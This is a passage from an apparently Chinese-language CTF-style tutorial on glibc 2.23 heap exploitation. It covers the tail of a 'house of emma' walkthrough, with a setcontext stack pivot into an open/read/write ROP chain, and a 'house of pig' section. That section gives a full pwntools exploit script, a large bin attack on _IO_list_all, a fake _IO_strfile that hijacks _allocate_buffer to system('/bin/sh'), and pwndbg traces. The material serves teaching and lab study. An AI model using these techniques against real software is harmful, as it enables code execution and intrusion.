   0x000079246d23e5e3 <+99>:    mov    rdx,QWORD PTR [rdi+0x88]
   0x000079246d23e5ea <+106>:   mov    rcx,QWORD PTR [rdi+0x98]
   0x000079246d23e5f1 <+113>:   mov    r8,QWORD PTR [rdi+0x28]
   0x000079246d23e5f5 <+117>:   mov    r9,QWORD PTR [rdi+0x30]
   0x000079246d23e5f9 <+121>:   mov    rdi,QWORD PTR [rdi+0x68]
   0x000079246d23e5fd <+125>:   xor    eax,eax
   0x000079246d23e5ff <+127>:   ret
   0x000079246d23e600 <+128>:   mov    rcx,QWORD PTR [rip+0x34e879]        # 0x79246d58ce80
   0x000079246d23e607 <+135>:   neg    eax
   0x000079246d23e609 <+137>:   mov    DWORD PTR fs:[rcx],eax
   0x000079246d23e60c <+140>:   or     rax,0xffffffffffffffff
   0x000079246d23e610 <+144>:   ret
End of assembler dump.
pwndbg> x/1gx 0x5f540630d010+0xa0  
0x5f540630d0b0: 0x00005f540630d460  <= new rsp
pwndbg> x/1gx 0x5f540630d010+0xa8
0x5f540630d0b8: 0x000079246d2202f2  <= rcx
pwndbg> x/i 0x000079246d2202f2
   0x79246d2202f2 <iconv+359>:  ret
   pwndbg> telescope 0x00005f540630d460 27
   00:0000│     0x5f540630d460 —▸ 0x79246d21d490 ◂— pop rax
   01:0008│     0x5f540630d468 ◂— 2
   02:0010│     0x5f540630d470 —▸ 0x79246d2202f1 (iconv+358) ◂— pop rdi
   03:0018│     0x5f540630d478 —▸ 0x5f540630d540 ◂— 'src/2.23/house_of_emma_again/flag'
   04:0020│     0x5f540630d480 —▸ 0x79246d21fee3 (__gcc_personality_v0+81) ◂— pop rsi
   05:0028│     0x5f540630d488 ◂— 0
   06:0030│     0x5f540630d490 —▸ 0x79246d201b92 ◂— pop rdx
   07:0038│     0x5f540630d498 ◂— 0
   08:0040│     0x5f540630d4a0 —▸ 0x79246d2d3d5e (__open_nocancel+5) ◂— syscall
   09:0048│     0x5f540630d4a8 —▸ 0x79246d21d490 ◂— pop rax
   0a:0050│     0x5f540630d4b0 ◂— 0
   0b:0058│     0x5f540630d4b8 —▸ 0x79246d2202f1 (iconv+358) ◂— pop rdi
   0c:0060│     0x5f540630d4c0 ◂— 4
   0d:0068│     0x5f540630d4c8 —▸ 0x79246d21fee3 (__gcc_personality_v0+81) ◂— pop rsi
   0e:0070│     0x5f540630d4d0 —▸ 0x5f540630d200 ◂— 0
   0f:0078│     0x5f540630d4d8 —▸ 0x79246d201b92 ◂— pop rdx
   10:0080│     0x5f540630d4e0 ◂— 0x100
   11:0088│     0x5f540630d4e8 —▸ 0x79246d2d3fce (__read_nocancel+5) ◂— syscall
   12:0090│     0x5f540630d4f0 —▸ 0x79246d21d490 ◂— pop rax
   13:0098│     0x5f540630d4f8 ◂— 1
   14:00a0│     0x5f540630d500 —▸ 0x79246d2202f1 (iconv+358) ◂— pop rdi
   15:00a8│     0x5f540630d508 ◂— 1
   16:00b0│     0x5f540630d510 —▸ 0x79246d21fee3 (__gcc_personality_v0+81) ◂— pop rsi
   17:00b8│     0x5f540630d518 —▸ 0x5f540630d200 ◂— 0
   18:00c0│     0x5f540630d520 —▸ 0x79246d201b92 ◂— pop rdx
   19:00c8│     0x5f540630d528 ◂— 0x100
   1a:00d0│     0x5f540630d530 —▸ 0x79246d2d402e (__write_nocancel+5) ◂— syscall
   pwndbg> 
```

在完成对`_IO_cookie_file`（或更广义的伪造`_IO_FILE_plus`）结构的布置后，利用流程进入关键的触发阶段。此时，chunks[0]处于已释放状态。如若再次尝试释放该chunk，这将立即触发glibc中针对double-free的检测机制。堆管理器在_int_free函数中会检测到该chunk的释放状态，从而判定为双重释放错误，并调用`malloc_printerr`函数输出错误信息并终止程序。

然而，在预设的利用路径中，`malloc_printerr`并非简单地终止进程。它在处理某些严重错误时，会进一步调用`_IO_flush_all_lockp`函数。该函数的作用是尝试刷新所有输出流，以确保错误信息能够写出。其内部会遍历由全局变量`_IO_list_all`所指向的`_IO_FILE`链表。此关键全局指针已在先前的large bin attack阶段被篡改为指向伪造的`_IO_FILE_plus`结构链表。

```bash
In file: /home/bogon/workSpaces/glibc/libio/genops.c:786
   780 #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
   781            || (_IO_vtable_offset (fp) == 0
   782                && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
   783                                     > fp->_wide_data->_IO_write_base))
   784 #endif
   785            )
 ► 786           && _IO_OVERFLOW (fp, EOF) == EOF)
 
 ► 0x79246d26de45 <_IO_flush_all_lockp+413>    call   qword ptr [rax + 0x18]      <_IO_cookie_write>
        rdi: 0x5f540630d940 ◂— 0
        rsi: 0xffffffff
        rdx: 0
```

在进入`_IO_flush_all_lockp`函数后，程序开始遍历由已被篡改的`_IO_list_all`全局指针所指向的伪造`_IO_FILE`结构链表。对于链表中的每个条目，该函数会检查其输出缓冲区状态，并在满足特定条件（例如缓冲区需刷新）时，通过其虚表（vtable）调用`_IO_OVERFLOW`函数指针。

此时，由于此前已事先精心伪造了`_IO_FILE`结构及其虚表，此处的`_IO_OVERFLOW`指针并未指向默认的`_IO_new_file_overflow`等合法函数，而是被修正（即篡改）为指向`_IO_cookie_write`函数的地址。`_IO_cookie_write`是`_IO_cookie_jumps`虚表中的合法条目，其设计初衷是允许开发者通过自定义的cookie回调函数处理I/O，因此通常能通过glibc高版本的虚表范围检查（如`IO_validate_vtable`）。

```bash
In file: /home/bogon/workSpaces/glibc/libio/iofopncook.c:64
   58   if (cfile->__io_functions.write == NULL)
   59     {
   60       fp->_flags |= _IO_ERR_SEEN;
   61       return 0;
   62     }
   63 
 ► 64   _IO_ssize_t n = cfile->__io_functions.write (cfile->__cookie, buf, size);
 
 ► 0x79246d2614e0 <_IO_cookie_write+35>    call   rax                         <setcontext+53>
        rdi: 0x5f540630d010 ◂— 0
        rsi: 0xffffffff
        rdx: 0
        rcx: 0
```

至此，控制流已成功从正常的库函数路径（`_IO_flush_all_lockp`）劫持至伪造的`_IO_cookie_file`结构所指定的`_IO_cookie_write`函数指针。在此利用场景中，并未将该指针（即`cfile->__io_functions.write`）设置为直接的代码执行函数（如system），而是设置为`setcontext+53`这一gadget的地址。这是一个关键的策略转变。`setcontext+53`是glibc中一个功能强大的代码片段，它能够从作为第一个参数传递的结构（通常是`ucontext_t`）中加载完整的寄存器上下文，从而实现对程序控制流的完全、精细的控制。

与此同时，该伪造结构的`cfile->__cookie`字段被精心设置为一个指向可控堆内存区域（地址0x5f540630d010）的指针。根据`_IO_cookie_write`的函数调用约定，其第一个参数正是这个cookie值。因此，当控制流跳转至`setcontext+53`执行时，其第一个参数（RDI寄存器）将指向这片可控堆内存。

```bash
In file: /home/bogon/workSpaces/glibc/sysdeps/unix/sysv/linux/x86_64/setcontext.S:72
   66         cfi_offset(%r14,oR14)
   67         cfi_offset(%r15,oR15)
   68         cfi_offset(%rsp,oRSP)
   69         cfi_offset(%rip,oRIP)
   70 
   71         movq        oRSP(%rdi), %rsp
 ► 72         movq        oRBX(%rdi), %rbx
 
pwndbg> stack 27
00:0000│ rsp 0x5f540630d460 —▸ 0x79246d21d490 ◂— pop rax
01:0008│     0x5f540630d468 ◂— 2
02:0010│     0x5f540630d470 —▸ 0x79246d2202f1 (iconv+358) ◂— pop rdi
03:0018│     0x5f540630d478 —▸ 0x5f540630d540 ◂— 'src/2.23/house_of_emma_again/flag'
04:0020│     0x5f540630d480 —▸ 0x79246d21fee3 (__gcc_personality_v0+81) ◂— pop rsi
05:0028│     0x5f540630d488 ◂— 0
06:0030│     0x5f540630d490 —▸ 0x79246d201b92 ◂— pop rdx
07:0038│     0x5f540630d498 ◂— 0
08:0040│     0x5f540630d4a0 —▸ 0x79246d2d3d5e (__open_nocancel+5) ◂— syscall
09:0048│     0x5f540630d4a8 —▸ 0x79246d21d490 ◂— pop rax
0a:0050│     0x5f540630d4b0 ◂— 0
0b:0058│     0x5f540630d4b8 —▸ 0x79246d2202f1 (iconv+358) ◂— pop rdi
0c:0060│     0x5f540630d4c0 ◂— 4
0d:0068│     0x5f540630d4c8 —▸ 0x79246d21fee3 (__gcc_personality_v0+81) ◂— pop rsi
0e:0070│     0x5f540630d4d0 —▸ 0x5f540630d200 ◂— 0
0f:0078│     0x5f540630d4d8 —▸ 0x79246d201b92 ◂— pop rdx
10:0080│     0x5f540630d4e0 ◂— 0x100
11:0088│     0x5f540630d4e8 —▸ 0x79246d2d3fce (__read_nocancel+5) ◂— syscall
12:0090│     0x5f540630d4f0 —▸ 0x79246d21d490 ◂— pop rax
13:0098│     0x5f540630d4f8 ◂— 1
14:00a0│     0x5f540630d500 —▸ 0x79246d2202f1 (iconv+358) ◂— pop rdi
15:00a8│     0x5f540630d508 ◂— 1
16:00b0│     0x5f540630d510 —▸ 0x79246d21fee3 (__gcc_personality_v0+81) ◂— pop rsi
17:00b8│     0x5f540630d518 —▸ 0x5f540630d200 ◂— 0
18:00c0│     0x5f540630d520 —▸ 0x79246d201b92 ◂— pop rdx
19:00c8│     0x5f540630d528 ◂— 0x100
1a:00d0│     0x5f540630d530 —▸ 0x79246d2d402e (__write_nocancel+5) ◂— syscall
pwndbg> 
```

在成功执行`setcontext+53`中的关键指令`movq oRSP(%rdi), %rsp`后，程序的栈指针（RSP）被精确地重定向至一个完全可控的堆内存地址0x5f540630d460。此地址位于先前通过堆漏洞精心布置的内存区域之内。该指令从`ucontext_t`结构体（其指针由RDI指向，即之前伪造的`__cookie`所指向的内存）的oRSP字段（对应`uc_mcontext.gregs[REG_RSP]`）加载新的栈指针值。这标志着一次成功的“栈迁移”（Stack Pivoting）操作，程序的原生栈被彻底替换为此前预设的、在堆上的伪造栈。

在此伪造栈地址0x5f540630d460处，已预先布置好一个精心构造的ROP（Return-Oriented Programming）链。此链通常被称为`orw gadget`序列，其名称来源于其核心功能：在沙箱（seccomp）仅允许`open、read、write`等少数系统调用的严格限制下，通过组合多个代码片段（gadgets）来依次执行open打开文件、read读取文件内容、write将内容输出到标准输出（如文件描述符1）的操作。

因此，当栈指针转移完成，且控制流通过后续的ret指令开始执行此ROP链时，程序的行为将完全遵循此前的精心设计。它能够绕过沙箱对execve等危险系统调用的封锁，通过合法的`open/read/write`调用组合，从目标文件系统（例如包含flag文件）中读取指定内容。这实现了在严格沙箱环境下从内存破坏到敏感信息泄露的完整利用，是高级漏洞利用中突破沙箱隔离的一种经典而有效的手段。


### 1-31 house of pig其一

本方法是一种融合了堆内存破坏与IO文件流劫持的高级漏洞利用技术。其核心机理在于，首先通过堆相关的漏洞（如use-after-free、堆溢出等）获取对堆内存的任意写原语，进而操控一个精心构造的`_IO_strfile`结构体。该结构体是GLIBC中用于处理字符串I/O的FILE流内部类型。关键技术点在于，将其虚表（vtable）指针篡改为libc中固有的、合法的`_IO_str_jumps`跳转表地址。

此举的核心优势在于能够有效绕过自GLIBC 2.24版本以来引入的vtable地址严格校验机制（如`IO_validate_vtable`函数）。该机制会检查vtable指针是否位于几个预定义的合法跳转表（如`_IO_str_jumps`、`_IO_file_jumps`）的范围内。通过直接使用合法的`_IO_str_jumps`地址，完全符合此项检查，从而规避了防护。

相关glibc完整源码参见[strops.c](https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/strops.c#L107)：

```C
typedef void *(*_IO_alloc_type) (_IO_size_t);
typedef void (*_IO_free_type) (void*);

struct _IO_str_fields
{
  _IO_alloc_type _allocate_buffer;
  _IO_free_type _free_buffer;
};

struct _IO_streambuf
{
  struct _IO_FILE _f;
  const struct _IO_jump_t *vtable;
};

typedef struct _IO_strfile_
{
  struct _IO_streambuf _sbf;
  struct _IO_str_fields _s;
} _IO_strfile;

const struct _IO_jump_t _IO_str_jumps =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_str_finish),
  JUMP_INIT(overflow, _IO_str_overflow),
  JUMP_INIT(underflow, _IO_str_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_str_pbackfail),
  JUMP_INIT(xsputn, _IO_default_xsputn),
  JUMP_INIT(xsgetn, _IO_default_xsgetn),
  JUMP_INIT(seekoff, _IO_str_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_default_setbuf),
  JUMP_INIT(sync, _IO_default_sync),
  JUMP_INIT(doallocate, _IO_default_doallocate),
  JUMP_INIT(read, _IO_default_read),
  JUMP_INIT(write, _IO_default_write),
  JUMP_INIT(seek, _IO_default_seek),
  JUMP_INIT(close, _IO_default_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};

int
_IO_str_overflow (_IO_FILE *fp, int c)
{
  int flush_only = c == EOF;
  _IO_size_t pos;
  if (fp->_flags & _IO_NO_WRITES)
      return flush_only ? 0 : EOF;
  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
    {
      fp->_flags |= _IO_CURRENTLY_PUTTING;
      fp->_IO_write_ptr = fp->_IO_read_ptr;
      fp->_IO_read_ptr = fp->_IO_read_end;
    }
  pos = fp->_IO_write_ptr - fp->_IO_write_base;
  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
    {
      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
	return EOF;
      else
	{
	  char *new_buf;
	  char *old_buf = fp->_IO_buf_base;
	  size_t old_blen = _IO_blen (fp);
	  _IO_size_t new_size = 2 * old_blen + 100;
	  if (new_size < old_blen)
	    return EOF;
	  new_buf
	    = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
	  if (new_buf == NULL)
	    {
	      /*	  __ferror(fp) = 1; */
	      return EOF;
	    }
	  if (old_buf)
	    {
	      memcpy (new_buf, old_buf, old_blen);
	      (*((_IO_strfile *) fp)->_s._free_buffer) (old_buf);
	      /* Make sure _IO_setb won't try to delete _IO_buf_base. */
	      fp->_IO_buf_base = NULL;
	    }
	  memset (new_buf + old_blen, '\0', new_size - old_blen);

	  _IO_setb (fp, new_buf, new_buf + new_size, 1);
	  fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);
	  fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);
	  fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);
	  fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);

	  fp->_IO_write_base = new_buf;
	  fp->_IO_write_end = fp->_IO_buf_end;
	}
    }

  if (!flush_only)
    *fp->_IO_write_ptr++ = (unsigned char) c;
  if (fp->_IO_write_ptr > fp->_IO_read_end)
    fp->_IO_read_end = fp->_IO_write_ptr;
  return c;
}
libc_hidden_def (_IO_str_overflow)

void
_IO_str_finish (_IO_FILE *fp, int dummy)
{
  if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
    (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);
  fp->_IO_buf_base = NULL;

  _IO_default_finish (fp, 0);
}
```

在`_IO_str_overflow`函数的利用中，主要存在两条独立但均可导向代码执行的路径，提供了在不同内存布局条件下的灵活性选择。

第一条路径聚焦于其缓冲区分配逻辑，具体体现在代码片段` (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);`。当函数判定当前输出缓冲区空间不足时，会尝试通过调用`_IO_strfile`结构体中`_s._allocate_buffer`成员所指向的函数来分配一块新的内存区域。若通过堆漏洞完全控制该结构体，即可将`_s._allocate_buffer`函数指针篡改为任意目标地址（如system函数或one_gadget的地址）。同时，通过精确控制结构体中的`_IO_buf_end`与`_IO_buf_base`字段，可以操控`new_size`参数的计算结果，使其成为一个期望的值（例如命令字符串`"/bin/sh"`的地址）。当程序执行流触发此路径时，对`_allocate_buffer`的调用将转化为一次可控的任意函数调用，例如`system("/bin/sh")`，从而实现代码执行。

第二条路径则利用其缓冲区释放操作，对应于代码` (*((_IO_strfile *) fp)->_s._free_buffer) (old_buf);`。在通过`_allocate_buffer`成功分配新缓冲区之后，函数会紧接着调用`_s._free_buffer`指针来释放旧的缓冲区`（old_buf）`。同样，可以劫持此函数指针。此路径的参数控制来源于`old_buf`，其值为旧缓冲区的地址，即原`_IO_buf_base`。通过预先布局，可以使`_IO_buf_base`指向需要的数据（如`"/bin/sh"`字符串）。因此，当触发`_free_buffer`调用时，其效果等同于执行`system("/bin/sh")`。这条路径的触发时机和参数来源与第一条路径不同，在某些场景下（例如new_size参数不易控制时）可作为更优或备选的利用方案，增强了利用的可靠性和适应性。

值得注意的是，在相关的`_IO_str_finish`函数中，其利用方式较为单一，主要表现为`(((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);`。该函数在流被关闭时调用，其利用机制与`_IO_str_overflow`中的释放路径类似，但触发条件不同。由于它仅涉及一次`_free_buffer`调用，其利用方式的分析将在下一章节进行集中探讨。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/14/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_pig/exploit.py)。

核心利用代码如下：

```python
# house of pig
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
malloc(0, 0x420)
malloc(1, 0x500)
malloc(2, 0x400)
delete(0)
malloc(3, 0x500)
content = show(0)
main_arena1096 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+1096: {hex(main_arena1096)}")
libc.address = main_arena1096 - 0x38DF68
log.info(f"libc base: {hex(libc.address)}")
system = libc.sym["system"]
log.info(f"system addr: {hex(system)}")
_IO_str_jumps = libc.sym["_IO_str_jumps"]
log.info(f"_IO_str_jumps addr: {hex(_IO_str_jumps)}")
_IO_list_all = libc.sym["_IO_list_all"]
log.info(f"_IO_list_all addr: {hex(_IO_list_all)}")

payload = b"A" * 0x10 + b"A"
edit(0, len(payload), payload)
content = show(0)
chunk0_addr = u64(content[0x10 : 0x10 + 6].ljust(8, b"\x00")) - ord("A")
log.info(f"chunk0 addr: {hex(chunk0_addr)}")
chunk2_addr = chunk0_addr + 0x420 + 0x10 + 0x500 + 0x10
log.info(f"chunk2 addr: {hex(chunk2_addr)}")

delete(2)
payload = p64(main_arena1096) + p64(_IO_list_all - 0x10)
payload += p64(chunk0_addr) + p64(_IO_list_all - 0x20)
edit(0, len(payload), payload)
malloc(4, 0x500)

payload = b"\x00" * (0x64 - 0x10) + b"/bin/sh\x00"
edit(0, len(payload), payload)
# new_size = 2 * (((fp)->_IO_buf_end - (fp)->_IO_buf_base)) + 100
# => (fp)->_IO_buf_end = (new_size - 100) / 2
#    (fp)->_IO_buf_base = 0
#    old_blen = ((fp)->_IO_buf_end - (fp)->_IO_buf_base)
fake_io = b"\x00" * (0x20 - 0x10) + p64(0)
fake_io = fake_io.ljust(0x28 - 0x10, b"\x00") + p64(int(((chunk0_addr + 100) - 100) / 2) + 1)
fake_io = fake_io.ljust(0x40 - 0x10, b"\x00") + p64(int(((chunk0_addr + 100) - 100) / 2))
fake_io = fake_io.ljust(0xA8 - 0x10, b"\x00") + p64(2)
fake_io = fake_io.ljust(0xB0 - 0x10, b"\x00") + p64(3)
fake_io = fake_io.ljust(0xC0 - 0x10, b"\x00") + p64(0xFFFFFFFF)
fake_io = fake_io.ljust(0xD8 - 0x10, b"\x00") + p64(_IO_str_jumps)
fake_io += p64(system)
edit(2, len(fake_io), fake_io)
delete(0)
conn.recvline()
cmd = b"cat src/2.23/house_of_pig/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

在利用过程的初始阶段，通过运用large bin attack技术，对堆内存中的chunks进行精细的布局和控制。该技术利用large bin管理机制中的特定漏洞，通过操纵chunks的大小、位置和指针，实现内存结构的重排。此举旨在强制内存分配器暴露关键的系统地址信息，包括libc库的基址和堆的起始地址。这些泄露的地址为后续的利用步骤提供了必要的数据基础，如计算函数偏移、构建payload或绕过安全防护机制，从而确保整个利用链的连续性和可靠性。

```bash
pwndbg> heap
Free chunk (largebins) | PREV_INUSE
Addr: 0x5d450eed5000
Size: 0x430 (with flag bits: 0x431)
fd: 0x72730d38df68
bk: 0x72730d38df68
fd_nextsize: 0x5d450eed5000
bk_nextsize: 0x5d450eed5000

Allocated chunk
Addr: 0x5d450eed5430
Size: 0x510 (with flag bits: 0x510)

Allocated chunk | PREV_INUSE
Addr: 0x5d450eed5940
Size: 0x410 (with flag bits: 0x411)

Allocated chunk | PREV_INUSE
Addr: 0x5d450eed5d50
Size: 0x510 (with flag bits: 0x511)

Top chunk | PREV_INUSE
Addr: 0x5d450eed6260
Size: 0x1fda0 (with flag bits: 0x1fda1)

pwndbg> largebins 
largebins
0x400-0x430: 0x5d450eed5000 —▸ 0x72730d38df68 (main_arena+1096) ◂— 0x5d450eed5000
pwndbg> 
```

在large bin attack的上下文中，对指定chunk的后向指针（bk）和大小链指针（bk_nextsize）进行精确篡改，是一项关键的利用步骤。此操作的核心在于干扰large bin内部的双重链表结构：bk指针用于维护一个双向链表，将相同大小的chunk连接在一起；而bk_nextsize指针则用于连接不同大小的chunk，形成一个按大小降序排列的“大小链”（size chain），以加速对大块内存的搜索。

通过恶意修改bk_nextsize指针，可以诱使堆管理器在将一个large chunk从unsorted bin插入到large bin时，执行链表重整操作。在此过程中，分配器会依据被篡改的bk_nextsize指针，将一个由可控的数值（通常是一个伪造的chunk地址或其size字段）写入目标位置。这实质上是将一个可控的、通常非常大的“size”值写入目标地址，从而构造出一个“任意地址写入巨大值”的原语。

对bk指针的修改则可以进一步影响chunk在常规链表中的顺序，辅助控制堆布局。这两项篡改共同作用，颠覆了分配器对large bin的预设管理逻辑。其直接后果是，在后续的分配或整理操作中，分配器会基于被污染的链表执行元数据更新，从而引发非预期的内存写入。该原语是后续实现关键全局变量（如`_IO_list_all`）覆盖、或制造其他必要内存破坏的先决条件。

```bash
pwndbg> largebins 
largebins
0x400-0x430 [corrupted]
FD: 0x5d450eed5000 —▸ 0x72730d38df68 (main_arena+1096) ◂— 0x5d450eed5000
BK: 0x5d450eed5000 —▸ 0x72730d38e530 ◂— 0
pwndbg> x/6gx 0x5d450eed5000
0x5d450eed5000: 0x0000000000000000      0x0000000000000431
0x5d450eed5010: 0x000072730d38df68      0x000072730d38e530
0x5d450eed5020: 0x00005d450eed5000      0x000072730d38e520
pwndbg> x/1gx &_IO_list_all
0x72730d38e540 <__GI__IO_list_all>:     0x000072730d38e560
pwndbg> 
```

在完成对堆内存的精密布局与对相关chunk的后向指针（bk）及大小链指针（bk_nextsize）的篡改后，通过发起一个特定大小的内存分配请求（malloc）来激活large bin attack。该请求驱动堆分配器执行_int_malloc函数中处理large bin的代码路径。分配器在遍历被恶意污染的large bin链表以寻找合适大小的chunk时，会执行链表重整操作。在此过程中，由于bk_nextsize指针已被篡改，分配器会错误地将其指向的内存地址（即此前预设的目标地址）视为一个合法的large chunk，进而将当前chunk的地址（或相关元数据）写入该位置。本次利用的具体目标是将全局变量`_IO_list_all`的内容修改为可控的堆地址（例如chunks[2]的地址）。

```bash
pwndbg> x/1gx &_IO_list_all
0x72730d38e540 <__GI__IO_list_all>:     0x00005d450eed5940
pwndbg> x/10gx chunks
0x5d44ef4e0060 <chunks>:        0x0000000000000020      0x00005d450eed5010
0x5d44ef4e0070 <chunks+16>:     0x0000000000000500      0x00005d450eed5440
0x5d44ef4e0080 <chunks+32>:     0x0000000000000400      0x00005d450eed5950
0x5d44ef4e0090 <chunks+48>:     0x0000000000000500      0x00005d450eed5d60
0x5d44ef4e00a0 <chunks+64>:     0x0000000000000500      0x00005d450eed6270
pwndbg> 
```

至此，利用前期获得的任意地址写入能力，可以在受控的chunks[2]内存区域中精心构造一个伪造的`_IO_strfile`结构体。

```bash
pwndbg> p/x *(_IO_strfile*)_IO_list_all
$1 = {
  _sbf = {
    _f = {
      _flags = 0x0,
      _IO_read_ptr = 0x411,
      _IO_read_end = 0x0,
      _IO_read_base = 0x0,
      _IO_write_base = 0x0,
      _IO_write_ptr = 0x2ea28776a801,
      _IO_write_end = 0x0,
      _IO_buf_base = 0x0,
      _IO_buf_end = 0x2ea28776a800,
      _IO_save_base = 0x0,
      _IO_backup_base = 0x0,
      _IO_save_end = 0x0,
      _markers = 0x0,
      _chain = 0x0,
      _fileno = 0x0,
      _flags2 = 0x0,
      _old_offset = 0x0,
      _cur_column = 0x0,
      _vtable_offset = 0x0,
      _shortbuf = {0x0},
      _lock = 0x0,
      _offset = 0x0,
      _codecvt = 0x0,
      _wide_data = 0x0,
      _freeres_list = 0x2,
      _freeres_buf = 0x3,
      __pad5 = 0x0,
      _mode = 0xffffffff,
      _unused2 = {0x0 <repeats 20 times>}
    },
    vtable = 0x72730d38c7a0
  },
  _s = {
    _allocate_buffer = 0x72730d03c3eb,
    _free_buffer = 0x0
  }
}
pwndbg> x/5i 0x72730d03c3eb
   0x72730d03c3eb <__libc_system>:      sub    rsp,0x8
   0x72730d03c3ef <__libc_system+4>:    test   rdi,rdi
   0x72730d03c3f2 <__libc_system+7>:    jne    0x72730d03c40a <__libc_system+31>
   0x72730d03c3f4 <__libc_system+9>:    lea    rdi,[rip+0x11a980]        # 0x72730d156d7b
   0x72730d03c3fb <__libc_system+16>:   call   0x72730d03be36 <do_system>
pwndbg> 
```

在完成对`_IO_strfile`结构的构造与布置后，开始进入执行阶段。此时，chunks[0]已被标记为释放状态。如若再次对该chunk发起释放操作，这将立即触发glibc堆管理器（_int_free）中的双重释放（double-free）检测。该检测机制会识别出chunks[0]已处于释放状态，从而判定此次操作为错误，并调用`malloc_printerr`函数处理此严重错误。

在预设的利用路径中，`malloc_printerr`并不会立即终止程序。其内部逻辑在处理此类错误时，会进一步调用`_IO_flush_all_lockp`函数，旨在刷新所有输出流以确保错误信息能够被写出，该函数会遍历由全局指针`_IO_list_all`所管理的`_IO_FILE`链表。

```bash
In file: /home/bogon/workSpaces/glibc/libio/genops.c:786
   780 #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
   781            || (_IO_vtable_offset (fp) == 0
   782                && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
   783                                     > fp->_wide_data->_IO_write_base))
   784 #endif
   785            )
 ► 786           && _IO_OVERFLOW (fp, EOF) == EOF)
 
 ► 0x72730d06de45 <_IO_flush_all_lockp+413>    call   qword ptr [rax + 0x18]      <_IO_str_overflow>
(py312) ?➜  ~ 
        rdi: 0x5d450eed5940 ◂— 0
        rsi: 0xffffffff
```

在控制流进入`_IO_flush_all_lockp`函数后，程序将遍历由已被覆盖的全局指针`_IO_list_all`所引用的`_IO_FILE`链表。该链表中的每个节点在此处已被替换为精心构造的伪造`_IO_FILE`结构。

对于链表中的每个伪造结构，函数都会检查其内部状态标志。当满足特定条件（例如输出缓冲区存在待刷新数据）时，程序会通过该结构所关联的虚表（vtable）解析并调用`_IO_OVERFLOW`函数指针。在此前预设的布局中，此指针并未指向默认的`_IO_new_file_overflow`等标准函数，而是被篡改为指向`_IO_str_overflow`函数的地址。`_IO_str_overflow`是`_IO_str_jumps`虚表中的合法条目，其调用符合glibc高版本的vtable验证机制，从而确保了控制流能够顺利转移至预设的代码路径。

```bash
In file: /home/bogon/workSpaces/glibc/libio/strops.c:104
    98       else
    99         {
   100           char *new_buf;
   101           char *old_buf = fp->_IO_buf_base;
   102           size_t old_blen = _IO_blen (fp);
   103           _IO_size_t new_size = 2 * old_blen + 100;
 ► 104           if (new_size < old_blen)
   105             return EOF;
   106           new_buf
   107             = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);

pwndbg> macro expand _IO_blen(fp)
expands to: ((fp)->_IO_buf_end - (fp)->_IO_buf_base)
pwndbg> p/x new_size
$2 = 0x5d450eed5064
pwndbg> x/s 0x5d450eed5064
0x5d450eed5064: "/bin/sh"
pwndbg> 
```

在分析`_IO_str_overflow`函数的实现时，可以观察到其新缓冲区大小new_size的计算公式为`new_size = 2 * (_IO_buf_end - _IO_buf_base) + 100`。基于此公式，可以逆向推导出缓冲区基址与结束址之间的差值关系，即`(_IO_buf_end - _IO_buf_base) = (new_size - 100) / 2`。通过精确控制伪造的`_IO_strfile`结构体中`_IO_buf_end`和`_IO_buf_base`字段的值，可以使得上述差值等于特定值，从而间接控制new_size的计算结果。

在利用过程中，常将new_size设置为命令字符串（如`"/bin/sh"`）地址相关的值。

```bash
In file: /home/bogon/workSpaces/glibc/libio/strops.c:107
   101           char *old_buf = fp->_IO_buf_base;
   102           size_t old_blen = _IO_blen (fp);
   103           _IO_size_t new_size = 2 * old_blen + 100;
   104           if (new_size < old_blen)
   105             return EOF;
   106           new_buf
 ► 107             = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
 
pwndbg> p/x ((_IO_strfile *) fp)->_s._allocate_buffer
$3 = 0x72730d03c3eb
pwndbg> x/5i 0x72730d03c3eb
   0x72730d03c3eb <__libc_system>:      sub    rsp,0x8
   0x72730d03c3ef <__libc_system+4>:    test   rdi,rdi
   0x72730d03c3f2 <__libc_system+7>:    jne    0x72730d03c40a <__libc_system+31>
   0x72730d03c3f4 <__libc_system+9>:    lea    rdi,[rip+0x11a980]        # 0x72730d156d7b
   0x72730d03c3fb <__libc_system+16>:   call   0x72730d03be36 <do_system>
pwndbg> 
```

通过将伪造的`_IO_strfile`结构中的`_allocate_buffer`函数指针设置为`system`函数的地址，此前new_size参数恰好等于字符串`"/bin/sh"`的地址。当程序执行流被导向`_IO_str_overflow`函数，并在其中尝试分配新缓冲区而调用`_allocate_buffer`函数指针时，实际执行的将是`system("/bin/sh")`，从而成功获取shell控制权。


### 1-32 house of pig其二

